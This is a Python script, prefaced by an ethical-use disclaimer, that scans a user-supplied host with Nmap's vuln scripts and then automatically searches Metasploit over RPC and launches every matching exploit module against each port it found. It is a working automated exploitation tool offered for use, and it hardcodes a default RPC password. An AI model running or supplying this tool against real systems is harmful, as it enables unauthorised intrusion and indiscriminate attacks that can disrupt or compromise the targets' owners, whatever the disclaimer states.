"""
Disclaimer:

This script is intended for educational and ethical penetration testing purposes only. By using this script, you acknowledge and agree to the following:

Authorization: You have explicit permission to perform security assessments and penetration tests on the target systems. Unauthorized access to any system is strictly prohibited.

Legal Compliance: You understand and comply with all local, state, and federal laws regarding cybersecurity and penetration testing activities. Unauthorized or malicious use of this script may violate applicable laws.

Risk Awareness: The use of exploits and vulnerability scanning tools can potentially disrupt systems or cause unintended consequences. Use this script at your own risk, and ensure you have backups and appropriate measures in place.

Documentation: It is recommended to document all actions performed using this script, including findings, actions taken, and results obtained. This documentation should be kept confidential and shared only with authorized personnel.

No Warranty: This script is provided "as is" without any warranty of fitness for a particular purpose or accuracy. The authors are not liable for any damages or consequences arising from the use or misuse of this script.

By executing this script, you agree to these terms and conditions. If you do not agree with these terms, do not use this script.


This script performs the following actions:
1. Uses Nmap to scan a target host for vulnerabilities using the `-sV` and `--script vuln` options.
2. Parses the scan results to identify any detected vulnerabilities.
3. Connects to a Metasploit RPC server to search for corresponding exploits for the identified vulnerabilities.
4. Attempts to exploit the vulnerabilities found using the discovered Metasploit modules.
5. Logs the process and results using Python's logging module.

Ensure you have Nmap installed and running, and that `msfrpcd` (Metasploit RPC daemon) is started and accessible.

Make sure to replace `target_host` with the actual IP address you intend to scan and adjust the Metasploit RPC connection details as needed.
"""

import nmap
import time
import logging
from pymetasploit3.msfrpc import MsfRpcClient

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize Nmap scanner
nm = nmap.PortScanner()

# Scan the target host
# target_host = "10.0.2.16"  # Replace with the target IP address
target_host = input("Enter the target host IP address: ")
logger.info(f"Scanning target host: {target_host}")
nm.scan(target_host, arguments="-sV --script vuln")

# Parse the scan results and collect vulnerabilities
vulnerabilities = []
for host in nm.all_hosts():
    logger.info(f"Host: {host}")
    for port in nm[host]["tcp"]:
        logger.info(f"Port: {port}")
        for key, value in nm[host]["tcp"][port].items():
            logger.info(f"{key}: {value}")
        if "script" in nm[host]["tcp"][port]:
            for script_id, script_output in nm[host]["tcp"][port]["script"].items():
                if "vuln" in script_id:
                    vulnerabilities.append((host, port, script_id, script_output))
                    logger.info(f"Vulnerability Script: {script_id}")
                    logger.info(f"Output: {script_output}")

if not vulnerabilities:
    logger.info("No vulnerabilities detected by Nmap.")
else:
    # Initialize Metasploit RPC client
    logger.info("Connecting to Metasploit RPC server")
    client = MsfRpcClient("kali")  # Replace "kali" with the actual password for Metasploit RPC

    # Exploit identified vulnerabilities
    for host, port, vuln_id, vuln_info in vulnerabilities:
        logger.info(f"Searching for exploits for vulnerability: {vuln_id}")
        search_results = client.modules.search(vuln_id)
        if not search_results:
            logger.info(f"No exploits found for vulnerability: {vuln_id}")
        for result in search_results:
            if result['type'] == 'exploit':
                exploit_module_name = result['fullname']
                logger.info(f"Using exploit module: {exploit_module_name}")
                exploit_module = client.modules.use('exploit', exploit_module_name)
                exploit_module['RHOSTS'] = host
                exploit_module['RPORT'] = port  # Dynamically set the port number

                try:
                    logger.info(f"Running exploit {exploit_module_name} against {host}:{port}")
                    result = exploit_module.execute()
                    logger.info(f"Exploit result: {result}")
                except Exception as e:
                    logger.error(f"Error running exploit {exploit_module_name} against {host}:{port}: {e}")

                time.sleep(5)  # Wait for exploitation to complete

logger.info("Exploitation attempts completed.")
